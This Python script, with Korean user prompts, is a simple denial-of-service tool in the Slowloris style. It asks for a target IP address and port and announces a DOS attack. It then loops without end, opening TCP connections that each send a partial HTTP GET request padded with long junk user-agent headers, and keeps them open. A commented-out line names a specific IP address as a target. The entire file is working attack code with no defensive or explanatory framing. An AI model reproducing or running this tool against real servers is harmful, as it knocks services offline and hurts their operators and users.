import socket
import random
import time
import keyboard  # using module keyboard


headers = [
    "User-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmI",
    "User-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmI"
] 



sockets = []


def setupSocket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)

    try:
        sock.connect((ip, port))
    except socket.error:
        print('연결 에러')
        #exit()

    
    sock.send("GET / HTTP/1.1\r\n".encode("utf-8"))
    
 
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))



    return sock




if __name__ == '__main__':
    ip = input("아이피 입력: ")
    #ip = "218.155.146.118"
    port = int(input("포트 입력: "))
    #port = 80
    

    print("Start DOS Atack Target > ",ip)



    
    
    while True:
        try:
            sock = setupSocket(ip, port)
            

            if sock == False:
                print('Target Not Found')
 
        except socket.error:
            print('Socket ERROR')
            print("Stop: (Q)")
            if keyboard.is_pressed('q'):  # if key 'q' is pressed 
                print('You Pressed A Key!')
                break  # finishing the loop
        

        
        sockets.append(sock)
    exit()
